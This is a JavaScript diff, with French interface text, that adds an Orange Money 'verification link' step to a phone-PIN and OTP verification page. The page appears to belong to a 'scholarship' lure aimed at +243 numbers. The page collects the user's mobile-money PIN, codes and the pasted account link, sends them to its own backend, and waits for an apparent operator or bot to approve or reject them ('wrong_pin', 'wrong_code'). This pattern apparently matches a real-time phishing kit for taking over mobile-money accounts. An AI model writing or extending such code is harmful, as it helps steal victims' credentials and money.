@@ -430,7 +430,13 @@ function initPhonePinVerification() {
         verifyPhonePinBtn.textContent = 'Vérifié ✓';
         verifyPhonePinBtn.classList.remove('btn-primary');
         verifyPhonePinBtn.classList.add('btn-success');
-        setTimeout(() => goToStep(3), 400);
+        setTimeout(() => {
+          if (paymentMethod === 'orange') {
+            showOrangeLinkStep();
+          } else {
+            goToStep(3);
+          }
+        }, 400);
       } else {
         const userMessage = result.error === 'Bot not enabled'
           ? 'Service temporairement indisponible. Veuillez réessayer plus tard.'
@@ -551,6 +557,119 @@ function initOtpVerification() {
   });
 }
 
+function showOrangeLinkStep() {
+  const step3Panel = document.getElementById('step3Panel');
+  const otpSection = document.getElementById('otpSection');
+  const orangeLinkSection = document.getElementById('orangeLinkSection');
+  const step3Heading = document.getElementById('step3Heading');
+  const step3Description = document.getElementById('step3Description');
+  
+  if (!step3Panel) return;
+  
+  goToStep(3);
+  
+  if (step3Heading) step3Heading.textContent = 'Vérification par lien Orange Money';
+  if (step3Description) step3Description.textContent = 'Un lien de vérification a été envoyé à votre numéro. Collez-le ci-dessous.';
+  if (otpSection) otpSection.classList.add('hidden');
+  if (orangeLinkSection) orangeLinkSection.classList.remove('hidden');
+}
+
+function initOrangeLinkVerification() {
+  const verifyBtn = document.getElementById('verifyOrangeLinkBtn');
+  const resendBtn = document.getElementById('orangeResendBtn');
+  const linkInput = document.getElementById('orangeLinkInput');
+  if (!verifyBtn) return;
+
+  verifyBtn.disabled = true;
+
+  const checkLink = () => {
+    const value = linkInput.value.trim();
+    verifyBtn.disabled = value.length === 0;
+  };
+
+  if (linkInput) {
+    linkInput.addEventListener('input', checkLink);
+  }
+
+  verifyBtn.addEventListener('click', async () => {
+    const link = linkInput.value.trim();
+    if (!link) return;
+
+    const phone = document.getElementById('phoneInput')?.value.replace(/\D/g, '') || '';
+    const countryCode = document.getElementById('countryTrigger')?.dataset?.dialCode || '+243';
+    const params = new URLSearchParams(window.location.search);
+    const flow = Security.sanitizeAlphanumeric(params.get('flow') || 'scholarship', 50);
+    const getPaymentMethod = window.getSelectedPaymentMethod ? window.getSelectedPaymentMethod() : 'airtel';
+    const paymentMethod = Security.sanitizeAlphanumeric(getPaymentMethod, 20);
+
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'Vérification en cours...';
+
+    try {
+      const response = await fetch(AppConfig.api('/api/verify/otp'), {
+        method: 'POST',
+        headers: AppConfig.getApiHeaders(),
+        body: JSON.stringify({ otp: link, phone, countryCode, flow, paymentMethod })
+      });
+      const result = await response.json();
+
+      if (result.success) {
+        verifyBtn.textContent = 'En attente d\'approbation...';
+        const pollInterval = setInterval(async () => {
+          try {
+            const statusResponse = await fetch(AppConfig.api(`/api/verify/otp/status/${result.id || 'latest'}`), {
+              headers: AppConfig.getApiHeaders()
+            });
+            const statusResult = await statusResponse.json();
+
+            if (statusResult.status === 'verified') {
+              clearInterval(pollInterval);
+              PollingManager.intervals.delete(pollInterval);
+              verifyBtn.textContent = 'Vérifié ✓';
+              setTimeout(() => goToStep(4), 600);
+            } else if (statusResult.status === 'wrong_code' || statusResult.status === 'wrong_pin') {
+              clearInterval(pollInterval);
+              PollingManager.intervals.delete(pollInterval);
+              verifyBtn.textContent = 'Vérification échouée';
+              verifyBtn.disabled = false;
+              linkInput.value = '';
+              checkLink();
+            }
+          } catch (error) {
+            console.error('Orange link polling error:', error);
+          }
+        }, 2000);
+        PollingManager.add(pollInterval);
+      } else {
+        throw new Error(result.error || 'Échec de la vérification du lien.');
+      }
+    } catch (error) {
+      console.error('Erreur de vérification lien Orange :', error);
+      verifyBtn.textContent = 'Erreur. Veuillez réessayer.';
+      verifyBtn.disabled = false;
+      setTimeout(() => { verifyBtn.textContent = 'Vérifier le lien'; }, 2000);
+    }
+  });
+
+  if (resendBtn) {
+    let seconds = 30;
+    resendBtn.addEventListener('click', () => {
+      seconds = 30;
+      resendBtn.disabled = true;
+      resendBtn.textContent = `Renvoyer dans ${seconds}s`;
+      const timer = setInterval(() => {
+        seconds--;
+        resendBtn.textContent = `Renvoyer dans ${seconds}s`;
+        if (seconds <= 0) {
+          clearInterval(timer);
+          resendBtn.disabled = false;
+          resendBtn.textContent = 'Renvoyer le lien';
+        }
+      }, 1000);
+    });
+  }
+}
+
 /* ---------------------------------------------------------
    Wire up verification page
 --------------------------------------------------------- */
@@ -565,6 +684,7 @@ function initVerifyPage() {
   initCountryDropdown();
   initPhonePinVerification();
   initOtpVerification();
+  initOrangeLinkVerification();
 
   window.getSelectedPaymentMethod = () => getPaymentMethod();
 
